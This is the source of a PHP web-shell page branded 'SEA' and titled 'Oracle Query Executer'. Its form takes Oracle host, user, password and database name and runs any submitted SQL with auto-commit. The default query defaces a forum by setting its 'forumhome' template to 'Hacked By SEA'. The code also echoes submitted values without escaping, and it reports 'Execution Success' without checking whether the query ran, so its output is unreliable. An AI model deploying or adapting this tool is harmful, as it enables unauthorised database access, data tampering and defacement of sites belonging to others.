
<html>
<head>
<title>SEA | Oracle Query Executer .</title>
<link rel="shortcut icon" href='http://sea.sy/style/css/images/sea_en.png' />
<meta http-equiv=Content-Type content=text/html; charset=UTF-8>
<style type="text/css">

.neon{
	color:blue;
	text-shadow: 0 0 5px red,0 0 10px red, 0 0 30px orange, 0 0 45px yellow, 0 0 60px red;
	}
.neon2{
	font-size:15px;
	color:lime;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.neon3{
	color:yellow;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.hacking{
	position:absolute;
	left:50px; font-size:35px;
	}
.like{
	border:4px double yellow;
	box-shadow:0px 2px 20px white;
	border-radius:10px;
	padding:9px;
	height:310px;}
	img{border:4px double yellow;
	box-shadow:0px 9px 15px white;
	border-radius:10px;
	opacity:0.75;
	-moz-opacity: 0.75;
	filter: alpha(opacity=75);
	}
a {
	text-decoration:none;}

</style>
<style>

@-webkit-keyframes tremer {
	0% {-webkit-transform: rotate(3deg);}
	50% {-webkit-transform: rotate(-3deg);}
	100% {-webkit-transform: rotate(3deg);}
	}
img:hover {
	-webkit-animation:tremer 0.2s linear infinite;
	-moz-animation:tremer 0.2s linear infinite;
	-o-animation:tremer 0.2s linear infinite;
	animation:tremer 0.2s linear infinite;
	}
</style>
<?php
$sh3llColor = "#0040FF";
echo CSS($sh3llColor)
?>
</head>
<!-- Oracle Query Executer -->
<center>
<p><img src="http://sea.sy/style/css/images/sea_en.png" height="200" width="400" style="height:200px;">	
<form enctype="multipart/form-data" method="POST">
  <table width='576' border='0' id='Box'>
    <tr>
<td width='4%' style="background:<?php echo $sh3llColor; ?>">&nbsp;</td>
<td colspan="2" >Oracle Query Executer</td>
</tr>
	<tr>
      <td rowspan="4">&nbsp;</td>
      <td width="17%">HOST </td>
      <td width="79%">
      <input type="text" name="host" value="<?php if($_POST['host']){echo $_POST['host'];}else {echo "localhost";} ?>" /></td>
    </tr>
<tr>
  <td>USER</td>
  <td><input type="text" name="user" value="<?php if($_POST['user']){echo $_POST['user'];} ?>"  /></td>
</tr>
<tr>
  <td >PASS</td>
  <td ><input type="text" name="pass" value="<?php if($_POST['pass']){echo $_POST['pass'];} ?>" /></td>
</tr>
<tr>
  <td height="26">DB Name</td>
  <td ><input type="text" name="dbName" value="<?php if($_POST['dbName']){echo $_POST['dbName'];} ?>" /></td>
</tr>
    <tr>
    <td colspan="3"><textarea cols='60' rows='10' name='sqlQuery' ><?php if($_POST['sqlQuery']){echo filter($_POST['sqlQuery']);}else {echo "UPDATE template SET template = 'Hacked By SEA' WHERE title = 'forumhome';";} ?></textarea></td></tr>
<tr><td colspan="3"><input type='submit' name='exe' value='Execute Query' id="exe" />
<?php
# --------------------------
#   Oracle Query Executer
#---------------------------

if($_POST['exe'])
{
	$host = $_POST['host'];
	$user = $_POST['user'];
	$pass = $_POST['pass'];
	$dbName = $_POST['dbName'];
	$query = $_POST['sqlQuery'];
	
	$connect = OracleConnect($host,$user,$pass,$dbName);
	if($connect != true)
	{echo "<font color='#FF0000'>".$connect."</font>";	}
	$queryExe = OracleQuery($connect,$query);
	if($query){echo "<font color='green'>Execution Success</font>";}
	else{echo "<font color='#FF0000'>Syntax Error in Oracle Query .</font>";}
}

?>
</td></tr>
</table></form>

<!-- End Of Oracle Query Executer -->
</center>

<?php
function OracleConnect($host = '127.0.0.1' ,$user ,$pass ,$dbName )
{
	$connect = oci_connect($user ,$pass ,$host."/".$dbName);
	if(!$connect){return "Connecting To Host : [".$host."] , User : [".$user."] , Pass : [".$pass."] , DbName : [".$dbName."] Failed ! .";}
	else {return $connect;}
}
function OracleQuery($connect,$query)
{
	$query = oci_parse( $connect, $query);	
	$queryExe = oci_execute($query,OCI_COMMIT_ON_SUCCESS);
	if($queryExe){return $queryExe;}
	else{return false;}
}
function footer()
{
	echo '<table bgcolor="#cccccc" width="100%"><tr>
	<td width="100%">
	<center><font color="gray" size="-2"><b>
	<font color="gray"></font><sy>   [
	</sy><font color="gray"></div><a href="http://www.sea.sy" target="_blank">www.sea.sy</a></font><sy> ]
	</sy></b>
	</td>
	</tr></table>
	</tbody>
	</body></html>
	';
}

function CSS($sh3llColor)
{
	$css =  "
	<style>
	BODY
	{
		FONT-FAMILY: Verdana; 
		margin: 2;
		color: #cccccc;
		background-color: #33363b;
	}
	sy  
	{
		color:".$sh3llColor.";
		font-size:7pt;
		font-weight: bold;
	}
	#Box
	{
	color:".$sh3llColor.";
	font-size:14px;
	background-color:#1C1C1C;
	font-weight:bold;
	width:500px;
	}
	tr 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #ffffff;
	}
	td 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #cccccc;
	}
	table 
	{
	BORDER:  #eeeeee  outset;
	BACKGROUND-COLOR: #1C1C1C;
	color: #cccccc;
	}
	input 
	{
	BORDER-RIGHT:  ".$sh3llColor." 1px solid;
	BORDER-TOP:    ".$sh3llColor." 1px solid;
	BORDER-LEFT:   ".$sh3llColor." 1px solid;
	BORDER-BOTTOM: ".$sh3llColor." 1px solid;
	BACKGROUND-COLOR: #333333;
	font: 9pt tahoma;
	color: #ffffff;
	}
	select 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #000000;
	font: 9pt tahoma;
	color: #CCCCCC;;
	}
	submit 
	{
	BORDER:  1px outset buttonhighlight;
	BACKGROUND-COLOR: #272727;
	width: 40%;
	color: #cccccc;
	}
	textarea 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #333333;
	color: #ffffff;
	}
	A:link {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:visited { COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:active {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:hover {color:blue;TEXT-DECORATION: none}
	</style>";
	return $css;
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0)
	{
		return stripslashes($string);	
	}
	else
	{
		return $string;	
	}
}
footer();
?>
